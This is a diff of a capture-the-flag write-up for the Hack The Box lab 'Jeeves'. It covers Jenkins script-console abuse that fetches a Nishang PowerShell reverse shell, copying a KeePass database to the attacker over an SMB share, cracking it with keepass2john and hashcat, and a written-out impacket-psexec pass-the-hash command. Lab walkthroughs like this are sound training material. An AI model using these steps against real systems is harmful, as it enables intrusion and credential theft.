@@ -70,7 +70,7 @@ If we look at the source code for the error page, we can see that what we're see
 <img src="jeeves.PNG" width="90%" height="100%">
 ```
 
-Andditioal scans with `dirsearch` and `nikto` show no additional subdirectories, or interesting endpoints to check out.
+Additional scans with `dirsearch` and `nikto` show no additional subdirectories, or interesting endpoints to check out.
 
 ### Port 50000
 
@@ -78,7 +78,7 @@ Running `dirsearch` on port 50000 shows a subdirectory for `/askjeeves`, which l
 
 ![](/assets/htb-jeeves/ask_jeeves_home.png)
 
-Digging into Jenkins page (*Manage Jenkins > About Jenkins*) allows us to see that we're looking at version 2.87 of the software. However, Exploit-DB doesn't show an exact match for this version.
+Digging into the Jenkins tools (*Manage Jenkins > About Jenkins*) allows us to see that we're looking at version 2.87 of the software. However, Exploit-DB doesn't show an exact match for this version.
 
 ---
 
@@ -90,7 +90,7 @@ In looking through the Jenkins tools available in the *Manage Jenkins* page, we 
 
 ![](/assets/htb-jeeves/jenkins_script_console.png)
 
-This page allows us to run a custom Groovy script on the server. We can exploit this to grab a good reverse shell. To do this, we'll need the Nishang github repo copied locally, as we'll need to grab a file from it, and host it, so that our code can reach out for it via Powershell to run.
+This page allows us to run a custom Groovy script on the server. We can exploit this to grab a good reverse shell. To do this, we'll need the [Nishang github repo](https://github.com/samratashok/nishang) copied locally, as we'll need to grab a file from it, and host it, so that our code can reach out for it via Powershell to run. My copy is cloned to `/opt/nishang`.
 
 Copy the Nishang `Invoke-PowerShellTcp.ps1` script to your working directory with:
 
@@ -131,9 +131,9 @@ As we go enumerating, we can see in the `C:\Users\kohsuke]Documents\` directory,
 
 To copy, we can setup a simple DMB Server on our machine with `impacket-smbserver kali .`, and copy the file to us with `copy CEH.kdbx \\10.10.14.15\kali\CEH.kdbx`.
 
-![](/assets/htb-jeeves/impacket_copy_keepass.png)
+<a href="/assets/htb-jeeves/impacket_copy_keepass.png"><img src="/assets/htb-jeeves/impacket_copy_keepass.png" width="95%"></a>
 
-Now that the file is local, we can get a crackable hash form it with `keepass2john CEH.kdbx > CEH.hash`. This will output a hash that `hashcat` will recognize, and can work with to crack.
+Now that the file is local, we can get a crackable hash from it with `keepass2john CEH.kdbx > CEH.hash`. This will output a hash that `hashcat` will recognize, and can work with to crack.
 
 ![](/assets/htb-jeeves/keepass2john.png)
 
@@ -155,7 +155,11 @@ In the list of credentials, we see some interesting possibilities for potential 
 
 ![](/assets/htb-jeeves/psexec_fail.png)
 
-If we look at the last entry in the list, it gives a simple ? as a username, and a long string as password. This is far too long to be a password. It actually looks like a hash. If this is the case, we might be able to use PSEXec via a Pass-the-hash attack, where we supply the hash instead of the password. We can test this with `impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 Administrator@10.10.10.63`.
+If we look at the last entry in the list, it gives a simple ? as a username, and a long string as password. This is far too long to be a password. It actually looks like a NTLM hash. If this is the case, we might be able to use PSEXec via a Pass-the-hash attack, where we supply the hash instead of the password. We can test this with:
+
+```bash
+impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 Administrator@10.10.10.63
+```
 
 ![](/assets/htb-jeeves/root_shell.png)
 
